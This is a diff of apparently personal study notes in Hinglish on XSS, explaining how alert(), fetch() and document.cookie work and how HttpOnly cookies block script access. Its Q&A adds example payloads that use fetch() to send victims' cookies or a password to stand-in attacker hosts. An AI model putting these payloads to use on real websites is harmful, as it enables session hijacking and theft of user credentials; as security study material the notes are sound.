@@ -67,6 +67,10 @@ fetch() ka kaam hota hai HTTP request bhejna JavaScript se.
 
 ---
 
+if else bhi 100% samj agya
+
+---
+
 ### Quick Summary
 
 **alert()**	Popup show karta hai	
@@ -92,6 +96,55 @@ XSS main use: Data leak (exfiltrate)
 **img.src** 	Image ke zariye request bhejna	
 XSS main use: Alternate data leak meth
 
-if else bhi 100% samj agya
+---
+
+✅ Q1: Agar main JavaScript jaisa yeh code enter kar doon: **let c = document.cookie; alert(c);**
+
+Toh kya mujhe mere browser ki cookie mil jaaye gi?
+
+✔️ Jawab:
+Haan! Agar tum yeh JavaScript code kisi website ke JavaScript console mein daalte ho (F12 > Console), aur us website ne cookies set ki hoti hain (aur wo HttpOnly nahi hain), toh alert(c) tumhein wo cookies dikha dega.
+
+**let c = document.cookie;
+alert(c);**
+
+### 🧠 Note: let ya var dono kaam karte hain — let sirf zyada modern hai, lekin cookies access karne mein koi farq nahi padta.
+
+---
+
+✅ Q2: Attacker yeh command likhta hai: fetch(**"https://evil.com/steal?cookie=" + document.cookie**);
+
+Kya yeh victim ki cookies le jaa sakta hai?
+
+✔️ Jawab:
+Haan! Agar attacker ka XSS payload kisi website mein run ho jaata hai (malicious script inject ho jaaye) aur victim ka browser wo script chala deta hai, toh document.cookie victim ki cookies uthata hai aur fetch() ke zariye hacker ki website pe send ho jaata hai.
+
+📦 Example full payload:
+
+**fetch("https://evil.com/steal?cookie=" + document.cookie);**
+
+---
+
+✅ Q3:Command: **fetch("https://attacker.com/steal?info=hello");**
+
+Kya hacker hello info apni site pe le ja raha hai?
+
+✔️ Jawab:
+Bilkul! Yeh sirf ek example hai — "hello" ek fake value hai. Attacker yahan koi bhi info daal sakta hai:
+
+**fetch("https://attacker.com/steal?info=" + document.cookie); // real cookie
+fetch("https://attacker.com/steal?pass=" + userPassword); // agar variable mein password hai**
+
+🧠 Iska matlab: fetch() basically ek chori ka raasta hai — secretly info bhejna.
+
+---
+
+### 🔐 Extra Note: HttpOnly Cookies
+
+Agar cookie HttpOnly flag ke sath set hui hai, toh JavaScript se document.cookie use karke access nahi kar sakte.
+
+Example: **Set-Cookie: sessionid=abc123; HttpOnly;**
+
+Toh XSS hone ke bawajood document.cookie khali rahega. ✅
 
 
